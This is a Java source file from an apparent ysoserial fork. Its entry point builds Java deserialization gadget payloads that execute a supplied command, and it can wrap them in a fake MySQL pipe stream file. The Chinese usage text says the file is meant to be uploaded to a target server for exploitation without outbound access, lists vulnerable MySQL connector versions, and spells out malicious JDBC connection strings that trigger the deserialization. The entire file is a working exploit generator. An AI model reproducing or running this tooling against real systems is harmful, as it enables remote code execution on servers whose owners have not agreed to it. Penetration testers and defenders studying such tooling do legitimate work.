package ysoserial;

import org.slf4j.LoggerFactory;
import ysoserial.mysql.FakeMySQLPipeFile;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;
import ch.qos.logback.classic.Logger;
import ch.qos.logback.classic.Level;

@SuppressWarnings("rawtypes")
public class GeneratePayload {
    private static final Logger logger = (Logger) LoggerFactory.getLogger(GeneratePayload.class);

    private static final int INTERNAL_ERROR_CODE = 70;
    private static final int USAGE_CODE = 64;

    public static void main(final String[] args) throws Exception {
        Logger rootLogger = (Logger) LoggerFactory.getLogger(Logger.ROOT_LOGGER_NAME);
        rootLogger.setLevel(Level.OFF); // 设置为 OFF 级别
        if (args.length != 3) {
            printUsage();
            System.exit(USAGE_CODE);
        }
        final String model = args[0];
        final String payloadType = args[1];
        final String command = args[2];

        if (model.equals("gadget")) {
            final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
            if (payloadClass == null) {
                System.err.println("Invalid payload type '" + payloadType + "'");
                printUsage();
                System.exit(USAGE_CODE);
                return; // make null analysis happy
            }

            try {
                final ObjectPayload payload = payloadClass.newInstance();
                final Object object = payload.getObject(command);
                PrintStream out = System.out;
                Serializer.serialize(object, out);
                Utils.releasePayload(payload, object);
            } catch (Throwable e) {
                System.err.println("Error while generating or serializing payload");
                e.printStackTrace();
                System.exit(INTERNAL_ERROR_CODE);
            }
            System.exit(0);
        }else if (model.startsWith("mysqlpipe_")) {
            String[] parts = model.split("_", 3);
            String[] vlist = {"5","5.1","8"};
            String version = "";
            String user = "";
            byte[] object = null;
            byte[] mysqlData = null;
            if (parts.length == 2|| parts.length == 3) {
                 version = parts[1]; // [version]
                 user = parts.length == 3 ? parts[2] : "mysql";
            }
            if (!Arrays.asList(vlist).contains(version)) {
                System.err.println("错误: mysql_jdbc版本，mysql存在漏洞版本(5.1.11-5.1.18,5.1.19-5.1.28,5.1.29,5.1.48,6.0.2-6.0.6),mysql8存在漏洞版本(8.0.7-8.0.20)\n" +
                    "     5.1_(5.1.11-5.1.18)\n" +
                    "     5_(mysql5/mysql6)\n" +
                    "     8_(8.0.7-8.0.20)\n" +
                    "     请输入 5/5.1/8" );
                System.exit(USAGE_CODE);
            }
            FakeMySQLPipeFile fakeMySQLPipeFile = new FakeMySQLPipeFile(version, user);
            if (payloadType.equals("custom")) {
                if (command.isEmpty() || command.matches("\\d+")) {
                    System.err.println("!!! 输入错误, 请输入gadget的base64编码数据或者输入gadget文件的路径");
                    System.exit(USAGE_CODE);
                }
                try {
                    mysqlData = Base64.getDecoder().decode(command);
                } catch (IllegalArgumentException e) {
                    try {
                        mysqlData = Files.readAllBytes(Paths.get(command));
                    } catch (IOException io) {
                        System.err.println("!!! 输入错误, 请输入gadget的base64编码数据或者输入gadget文件的路径");
                        System.exit(USAGE_CODE);
                    }
                }
                object = fakeMySQLPipeFile.getObject(mysqlData);
                    PrintStream out = System.out;
                    out.write(object);
                    out.flush();
                    System.exit(0);
            }
            object = fakeMySQLPipeFile.getObject(build(payloadType, command));
            PrintStream out = System.out;
            out.write(object);
            out.flush();
        }else {
            printUsage();
            System.exit(USAGE_CODE);
        }

    }


    private static byte[] build(String payloadType, String command) {
        final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            printUsage();
            System.exit(USAGE_CODE);
        }

        try {
            final ObjectPayload payload = payloadClass.newInstance();
            final Object object = payload.getObject(command);
            return Serializer.serialize(object);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(INTERNAL_ERROR_CODE);
        }
        return null;
    }

    private static void printUsage() {
        System.err.println("Y SO SERIAL_mysqlpipe ?");
        System.err.println("Usage: java -jar ysoserial_mysqlpipe-[version]-all.jar [mode] [payload] '[command]'");
        System.err.println("[mode]: [gadget]/[mysqlpipe]_[version]_(user) ");
        System.err.println("提供mysql的pipe恶意流文件，上传服务器，进行不出网利用,数据库为test,用户名默认mysql,可自己设置。\n"+
            "mysql5: jdbc:mysql://xxx/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.jdbc.NamedPipeSocketFactory&namedPipePath=output.pcap\n"+
            "msysql6: jdbc:mysql://xxx/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&namedPipePath=output.pcap\n"+
            "mysql8: jdbc:mysql://xxx/test?&maxAllowedPacket=74996390&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.cj.protocol.NamedPipeSocketFactory&namedPipePath=output.pcap");
        System.err.println("  Available payload types:");

        final List<Class<? extends ObjectPayload>> payloadClasses =
            new ArrayList<Class<? extends ObjectPayload>>(Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[]{"Payload", "Authors", "Dependencies"});
        rows.add(new String[]{"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
            rows.add(new String[]{
                payloadClass.getSimpleName(),
                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
    public static String bytesToHex(byte[] bytes) {
        StringBuilder result = new StringBuilder();
        for (byte b : bytes) {
            result.append(String.format("%02X", b));
        }
        return result.toString();
    }
}
